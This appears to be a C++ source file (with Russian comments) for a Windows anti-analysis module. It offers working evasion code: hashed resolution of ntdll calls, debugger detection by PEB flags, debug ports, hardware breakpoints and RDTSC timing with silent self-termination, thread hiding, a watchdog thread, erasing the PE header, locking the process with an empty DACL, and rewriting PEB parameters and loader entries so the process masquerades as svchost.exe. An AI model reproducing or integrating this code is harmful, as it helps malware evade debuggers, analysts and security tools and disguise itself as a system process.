#include "anti_analysis.hpp"
#include "api_hasher.hpp"
#include <windows.h>
#include <aclapi.h>
#include <chrono>
#include <thread>
#include <atomic>
#include <intrin.h>

namespace AntiAnalysis {

namespace {

typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength
);

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pfnNtTerminateProcess)(
    HANDLE ProcessHandle,
    NTSTATUS ExitStatus
);

static inline void silentTerminate() {
    auto pNtTerminateProcess = ApiHasher::resolve<pfnNtTerminateProcess>(
        ApiHasher::HASH_NTDLL,
        ApiHasher::HASH_NtTerminateProcess
    );
    if (pNtTerminateProcess) {
        pNtTerminateProcess(GetCurrentProcess(), 0);
    }
    ExitProcess(0);
}

static std::atomic<bool> s_watchdogRunning{ false };

} // namespace

void runGuard() {
    // 1. Прямой доступ к PEB (без импорта WinAPI в IAT)
#if defined(_M_X64) || defined(__x86_64__)
    uint8_t* peb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    if (peb) {
        // BeingDebugged (смещение 0x02)
        if (peb[2] != 0) {
            silentTerminate();
        }
        // NtGlobalFlag (смещение 0xBC на x64)
        DWORD ntGlobalFlag = *reinterpret_cast<DWORD*>(peb + 0xBC);
        // Флаги отладки кучи: FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20) | FLG_HEAP_VALIDATE_PARAMETERS (0x40)
        if (ntGlobalFlag & 0x70) {
            silentTerminate();
        }
    }
#endif

    // 2. Скрытие текущего потока от отладчика (ThreadHideFromDebugger = 0x11)
    auto pNtSetInfoThread = ApiHasher::resolve<pfnNtSetInformationThread>(
        ApiHasher::HASH_NTDLL,
        ApiHasher::HASH_NtSetInformationThread
    );
    if (pNtSetInfoThread) {
        pNtSetInfoThread(GetCurrentThread(), 0x11, NULL, 0);
    }

    // 3. Запрос флагов отладки через NtQueryInformationProcess
    auto pNtQueryInfoProc = ApiHasher::resolve<pfnNtQueryInformationProcess>(
        ApiHasher::HASH_NTDLL,
        ApiHasher::HASH_NtQueryInformationProcess
    );
    if (pNtQueryInfoProc) {
        // ProcessDebugPort (класс 7) — возвращает ненулевой порт, если подключен отладчик
        DWORD_PTR debugPort = 0;
        if (pNtQueryInfoProc(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL) == 0) {
            if (debugPort != 0) {
                silentTerminate();
            }
        }

        // ProcessDebugObjectHandle (класс 30 / 0x1E)
        HANDLE debugObj = NULL;
        if (pNtQueryInfoProc(GetCurrentProcess(), 30, &debugObj, sizeof(debugObj), NULL) == 0) {
            if (debugObj != NULL) {
                CloseHandle(debugObj);
                silentTerminate();
            }
        }
    }

    // 4. Проверка аппаратных контрольных точек (Hardware Breakpoints: DR0 - DR3)
    // Используем RtlCaptureContext — безопасный API для текущего потока
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    RtlCaptureContext(&ctx);
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
        silentTerminate();
    }

    // 5. Замер тактов процессора RDTSC (детектирование пошаговой отладки / single-stepping)
    uint64_t t1 = __rdtsc();
    volatile uint64_t sum = 0;
    for (int i = 0; i < 300; ++i) {
        sum ^= (static_cast<uint64_t>(i) * 1664525ULL);
    }
    uint64_t t2 = __rdtsc();
    // При нормальном выполнении разница < 10 000 тактов. При пошаговой трассировке — миллионы.
    if ((t2 - t1) > 5'000'000) {
        silentTerminate();
    }
}

void startWatchdog() {
    if (s_watchdogRunning.exchange(true)) return;

    std::thread th([]() {
        protectThreadUserMode(GetCurrentThread());
        auto pNtSetInfoThread = ApiHasher::resolve<pfnNtSetInformationThread>(
            ApiHasher::HASH_NTDLL,
            ApiHasher::HASH_NtSetInformationThread
        );
        if (pNtSetInfoThread) {
            pNtSetInfoThread(GetCurrentThread(), 0x11, NULL, 0);
        }

        while (s_watchdogRunning.load(std::memory_order_relaxed)) {
            runGuard();
            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
        }
    });
    th.detach();
}

void stopWatchdog() {
    s_watchdogRunning.store(false, std::memory_order_relaxed);
}

void maskPEHeader() {
    HMODULE hMod = GetModuleHandleA(NULL);
    if (!hMod) return;

    DWORD oldProtect = 0;
    if (VirtualProtect(hMod, 4096, PAGE_READWRITE, &oldProtect)) {
        auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(hMod);
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
            pDos->e_magic = 0;
        }
        VirtualProtect(hMod, 4096, oldProtect, &oldProtect);
    }
}

void protectThreadUserMode(void* hThread) {
    HANDLE targetThread = hThread ? static_cast<HANDLE>(hThread) : GetCurrentThread();
    PACL pAcl = (PACL)LocalAlloc(LPTR, sizeof(ACL));
    if (pAcl) {
        if (InitializeAcl(pAcl, sizeof(ACL), ACL_REVISION)) {
            // Ограниченный DACL: запрещает открытие дескриптора потока через OpenThread
            SetSecurityInfo(targetThread, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL);
        }
        LocalFree(pAcl);
    }
}

void protectProcessUserMode() {
    HANDLE hProcess = GetCurrentProcess();
    PACL pAcl = (PACL)LocalAlloc(LPTR, sizeof(ACL));
    if (pAcl) {
        if (InitializeAcl(pAcl, sizeof(ACL), ACL_REVISION)) {
            // Ограниченный DACL: запрещает другим Ring 3 процессам открытие нашего процесса через OpenProcess
            SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL);
        }
        LocalFree(pAcl);
    }
    protectThreadUserMode(GetCurrentThread());
}

typedef struct _UNICODE_STRING_DATA {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_DATA, *PUNICODE_STRING_DATA;

void maskProcessParameters(const wchar_t* fakePath, const wchar_t* fakeCmd) {
#if defined(_M_X64) || defined(__x86_64__)
    if (!fakePath) fakePath = L"C:\\Windows\\System32\\svchost.exe";
    if (!fakeCmd) fakeCmd = L"svchost.exe -k netsvcs";

    uint8_t* pPeb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    if (!pPeb) return;

    // 1. Маскировка ProcessParameters (ImagePathName и CommandLine)
    uint8_t* pParams = *reinterpret_cast<uint8_t**>(pPeb + 0x20);
    if (pParams) {
        auto pImagePath = reinterpret_cast<PUNICODE_STRING_DATA>(pParams + 0x60);
        auto pCmdLine = reinterpret_cast<PUNICODE_STRING_DATA>(pParams + 0x70);

        size_t fakeImageBytes = wcslen(fakePath) * sizeof(wchar_t);
        if (pImagePath->MaximumLength >= fakeImageBytes + sizeof(wchar_t)) {
            wcscpy_s(pImagePath->Buffer, pImagePath->MaximumLength / sizeof(wchar_t), fakePath);
            pImagePath->Length = static_cast<USHORT>(fakeImageBytes);
        } else {
            pImagePath->Buffer = const_cast<PWSTR>(fakePath);
            pImagePath->Length = static_cast<USHORT>(fakeImageBytes);
            pImagePath->MaximumLength = static_cast<USHORT>(fakeImageBytes + sizeof(wchar_t));
        }

        size_t fakeCmdBytes = wcslen(fakeCmd) * sizeof(wchar_t);
        if (pCmdLine->MaximumLength >= fakeCmdBytes + sizeof(wchar_t)) {
            wcscpy_s(pCmdLine->Buffer, pCmdLine->MaximumLength / sizeof(wchar_t), fakeCmd);
            pCmdLine->Length = static_cast<USHORT>(fakeCmdBytes);
        } else {
            pCmdLine->Buffer = const_cast<PWSTR>(fakeCmd);
            pCmdLine->Length = static_cast<USHORT>(fakeCmdBytes);
            pCmdLine->MaximumLength = static_cast<USHORT>(fakeCmdBytes + sizeof(wchar_t));
        }
    }

    // 2. Маскировка LDR таблицы (главный исполняемый модуль)
    uint8_t* pLdr = *reinterpret_cast<uint8_t**>(pPeb + 0x18);
    if (pLdr) {
        PLIST_ENTRY pHead = reinterpret_cast<PLIST_ENTRY>(pLdr + 0x10);
        if (pHead && pHead->Flink != pHead) {
            uint8_t* pFirstEntry = reinterpret_cast<uint8_t*>(pHead->Flink);
            if (pFirstEntry) {
                auto pFullDllName = reinterpret_cast<PUNICODE_STRING_DATA>(pFirstEntry + 0x48);
                auto pBaseDllName = reinterpret_cast<PUNICODE_STRING_DATA>(pFirstEntry + 0x58);

                const wchar_t* baseName = wcsrchr(fakePath, L'\\');
                baseName = baseName ? (baseName + 1) : fakePath;

                size_t fullBytes = wcslen(fakePath) * sizeof(wchar_t);
                if (pFullDllName->MaximumLength >= fullBytes + sizeof(wchar_t)) {
                    wcscpy_s(pFullDllName->Buffer, pFullDllName->MaximumLength / sizeof(wchar_t), fakePath);
                    pFullDllName->Length = static_cast<USHORT>(fullBytes);
                } else {
                    pFullDllName->Buffer = const_cast<PWSTR>(fakePath);
                    pFullDllName->Length = static_cast<USHORT>(fullBytes);
                    pFullDllName->MaximumLength = static_cast<USHORT>(fullBytes + sizeof(wchar_t));
                }

                size_t baseBytes = wcslen(baseName) * sizeof(wchar_t);
                if (pBaseDllName->MaximumLength >= baseBytes + sizeof(wchar_t)) {
                    wcscpy_s(pBaseDllName->Buffer, pBaseDllName->MaximumLength / sizeof(wchar_t), baseName);
                    pBaseDllName->Length = static_cast<USHORT>(baseBytes);
                } else {
                    pBaseDllName->Buffer = const_cast<PWSTR>(baseName);
                    pBaseDllName->Length = static_cast<USHORT>(baseBytes);
                    pBaseDllName->MaximumLength = static_cast<USHORT>(baseBytes + sizeof(wchar_t));
                }
            }
        }
    }
#endif
}

} // namespace AntiAnalysis
